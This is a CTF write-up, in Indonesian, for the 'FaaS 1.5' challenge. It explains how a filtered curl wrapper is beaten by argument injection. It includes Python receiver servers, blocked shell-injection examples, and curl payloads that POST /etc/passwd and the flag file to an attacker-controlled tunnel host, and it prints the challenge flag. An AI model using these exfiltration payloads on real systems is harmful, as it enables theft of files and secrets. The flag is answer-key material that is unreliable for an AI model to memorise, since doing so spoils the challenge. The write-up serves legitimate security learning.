# FaaS 1.5 — Writeup

## Challenge

**Name:** FaaS 1.5
**Category:** Pwn / Web-ish Command Injection
**Remote:** `nc challs.scriptsorcerers.xyz 10398` / instance port provided by launcher

Description:

> Flag is in the user's home directory

Service hanya menampilkan prompt:

```text
enter host:
```

Input tersebut digunakan untuk mengambil judul halaman web (`<title>`). Jika sukses, service mencetak hasil seperti:

```text
validating title: Example Domain
title secure
completed fetching: Example Domain
```

## Flag

```text
scriptCTF{0S_c0mm4nd_1nj3ct10n_1s_t3chn1c4lly_Pwn_8083eccbde32}
```

## TL;DR

Service memanggil `curl` terhadap input host. Karakter shell metacharacter seperti `;`, `&`, `|`, `$`, backtick, dan karakter lainnya diblokir, tetapi spasi masih diperbolehkan. Akibatnya, kita bisa melakukan **curl option injection**.

Payload final:

```text
example.com -X POST --data-binary @/home/crazy_user_for_challenge/flag.txt http://ATTACKER_HOST/flag
```

`curl` tetap mengambil `example.com` sehingga validasi title tetap sukses, tetapi opsi tambahan membuat `curl` juga melakukan POST isi file flag ke server attacker.

## Recon

Pertama, input biasa dicoba:

```text
example.com
```

Output:

```text
validating title: Example Domain
title secure
completed fetching: Example Domain
```

Ini menunjukkan service mengambil halaman web dari host yang diberikan, kemudian mengekstrak tag `<title>`.

Input URL lengkap seperti:

```text
http://example.com
https://example.com
file:///etc/passwd
```

menghasilkan:

```text
error: could not fetch title
```

Jadi service kemungkinan menambahkan skema `http://` sendiri dan hanya mengharapkan bentuk `host/path`.

## Filter

Payload command injection langsung seperti berikut diblokir:

```text
127.0.0.1;cat ~/flag*
127.0.0.1&&cat ~/flag*
127.0.0.1|cat ~/flag*
```

Output:

```text
hacking attempt detected
```

Fuzzing karakter menunjukkan banyak metacharacter diblokir, tetapi spasi, `/`, `:`, `.`, `-`, `_`, `@`, dan `=` masih diperbolehkan. Ini membuat command injection shell langsung sulit, tetapi membuka kemungkinan **argument injection** terhadap command yang digunakan service.

## Controlled Host Test

Untuk memastikan service benar-benar menggunakan `curl`, dibuat server HTTP attacker menggunakan Python:

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"<html><head><title>HELLO_STAGE</title></head><body>OK</body></html>"
        print("[+] got request", self.path, flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

Server lokal kemudian diekspos ke internet menggunakan tunnel, misalnya:

```text
b85ec14887d4e2.lhr.life
```

Input:

```text
b85ec14887d4e2.lhr.life
```

Output:

```text
validating title: HELLO_STAGE
title secure
completed fetching: HELLO_STAGE
```

Ini mengonfirmasi bahwa host attacker dapat dikontrol dan title dari response kita diparse oleh service.

## Curl Option Injection

Test berikut dilakukan:

```text
example.com http://b85ec14887d4e2.lhr.life/optinj
```

Walaupun output service tetap:

```text
validating title: Example Domain
title secure
completed fetching: Example Domain
```

server attacker menerima request:

```text
[+] got request /optinj
```

Artinya input setelah spasi tidak dipotong sepenuhnya. Input tersebut diteruskan sebagai argumen tambahan ke `curl`. Dengan kata lain, kita memiliki **curl argument injection**.

## Exfiltrating `/etc/passwd`

Receiver POST dibuat:

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"<html><head><title>OK</title></head><body>OK</body></html>"
        print("[GET]", self.path, flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0"))
        data = self.rfile.read(n)

        print("\n[POST]", self.path)
        print(data.decode(errors="ignore"))
        print("[/POST]\n", flush=True)

        body = b"<html><head><title>OK</title></head><body>OK</body></html>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

Payload:

```text
example.com -X POST --data-binary @/etc/passwd http://b85ec14887d4e2.lhr.life/passwd
```

Receiver mendapatkan isi `/etc/passwd`, termasuk user:

```text
crazy_user_for_challenge:x:1001:1001::/home/crazy_user_for_challenge:/bin/bash
```

Dari sini diketahui lokasi home directory flag:

```text
/home/crazy_user_for_challenge
```

## Exfiltrating Flag

Payload final:

```text
example.com -X POST --data-binary @/home/crazy_user_for_challenge/flag.txt http://b85ec14887d4e2.lhr.life/flag
```

Receiver mendapatkan:

```text
[POST] /flag
scriptCTF{0S_c0mm4nd_1nj3ct10n_1s_t3chn1c4lly_Pwn_8083eccbde32}
[/POST]
```

## Flag

```text
scriptCTF{0S_c0mm4nd_1nj3ct10n_1s_t3chn1c4lly_Pwn_8083eccbde32}
```
